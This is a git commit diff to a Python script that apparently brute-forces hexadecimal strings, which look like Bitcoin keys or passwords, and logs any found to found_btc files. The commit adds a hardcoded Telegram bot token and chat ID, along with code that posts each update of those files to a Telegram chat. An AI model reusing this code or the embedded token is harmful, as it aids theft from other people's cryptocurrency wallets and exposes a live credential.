32a6f210681ffb66d20ffe2d045fa6a633f3cdf6
schreera <81811318+schreera@users.noreply.github.com>
2023-08-26 19:58:28 +0300

    Add files via upload

--- gen_hex_st.py
+++ gen_hex_st.py
@@ -3,11 +3,14 @@ import sys
 import threading
 import time
 import shutil
+import requests
 
 hex_chars = '0123456789abcdef'
 
 max_password_length = 9  # Максимальная длина пароля
 max_total_length = 64    # Максимальная общая длина строки
+TOKEN = "6045137068:AAEoWIkvi_yi7buT4WXO5dc-uKrsLouXCMA"
+CHAT_ID = "-1001938475530"
 
 def get_config_filename(start_char):
     return f"config_{start_char}.txt"
@@ -27,14 +30,32 @@ def load_progress(start_char):
             return length, password, shift
     except:
         return 1, "", 0
-
+        
+def send_message_to_telegram(text):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    
+    text_parts = [text[i:i + 4090] for i in range(0, len(text), 4090)]
+    
+    for part in text_parts:
+        payload = {
+            "chat_id": CHAT_ID,
+            "text": part
+        }
+        response = requests.post(url, payload)
+        if not response.json().get("ok"):
+            print(f"Ошибка при отправке сообщения в Телеграм: {response.json().get('description')}")
+            
 def backup_results(start_char):
+    prev_content = ""
     while True:
-        with open(f"found_btc_{start_char}", "r") as source, open(f"result_{start_char}", "a") as target:
+        with open(f"found_btc_{start_char}", "r") as source:
             content = source.read()
-            if content:
-                target.write("\n" + content)
-        time.sleep(100)
+            if content and content != prev_content:
+                with open(f"result_{start_char}", "a") as target:
+                    target.write("\n" + content)
+                send_message_to_telegram(f"Файл found_btc_{start_char} обновлен!\n\n{content}")
+                prev_content = content
+        time.sleep(100)               
 
 if len(sys.argv) != 2:
     print("Использование: python3 ваш_скрипт.py [начальный символ]")
@@ -67,7 +88,7 @@ for length in range(length_start, max_password_length + 1):
             print(password_str)
             
             counter += 1
-            if counter % 300000 == 0:
+            if counter % 1000000 == 0:
                 save_progress(length, password, shift + 1, start_char)           
             shift_start = 0
         password_start = ""
